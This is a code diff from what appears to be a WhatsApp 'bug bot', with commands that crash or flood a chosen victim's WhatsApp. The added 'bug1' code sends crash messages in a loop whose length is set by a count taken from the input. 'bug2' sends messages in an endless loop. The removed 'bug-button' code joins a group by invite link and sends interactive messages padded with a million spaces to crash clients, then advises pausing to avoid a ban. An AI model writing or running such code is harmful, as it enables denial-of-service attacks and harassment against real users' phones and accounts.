@@ -405,12 +405,11 @@ switch (command) {
 case 'bug1': { 
 if (!isDeveloper) return m.reply('Fitur Ini Khusus Owner')
 if (!q) return reply(`Contoh : ${prefix+command} 628xxx`)
-let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return m.replay(`Eror | Contoh : ${prefix+command} 628xxx`)
-let target = bijipler + '@s.whatsapp.net'
-for (let j = 0; j < 30; j++) {
-await bakdok(target, force)
-await ngeloc(target, force)}
+victim = text.split("|")[0]+"@s.whatsapp.net"
+amount = text.split("|")[1] * 30
+for (let i = 0; i < amount; i++) {
+await bakdok(victim, force)
+await ngeloc(victim, force)}
 reply('Sukses Mengirim Bug')}
 break
 case 'bug2': { 
@@ -422,45 +421,6 @@ let target = bijipler + '@s.whatsapp.net'
 for (;;) {
 await aipong(target, force)} 
 reply('Sukses')}
-break
-case 'bug-button': {
-if (!isDeveloper) return reply('Fithr Ini Khusus Owner')
-if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
-reply(mess.bugrespon)
-let result = args[0].split('https://chat.whatsapp.com/')[1];
-let target = await Cexzas.groupAcceptInvite(result);
-for (let j = 0; j < 5; j++) {
-var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
-message: {
-  "interactiveMessage": {
-    "header": {
-      "title": "",
-      "subtitle": " "
-    },
-    "body": {
-      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
-    },
-    "footer": {
-      "text": "›          #Cexzasdominate"
-    },
-    "nativeFlowMessage": {
-      "buttons": [
-        {
-          "name": "cta_url",
-          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
-        }
-      ],
-      "messageParamsJson": " ".repeat(1000000)
-    }
-  }
-}
-}
-}), { userJid: target, quoted: ryobug })
-await Cexzas.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
-await sleep(700)
-}
-reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
-}
 break
 default:
 }}
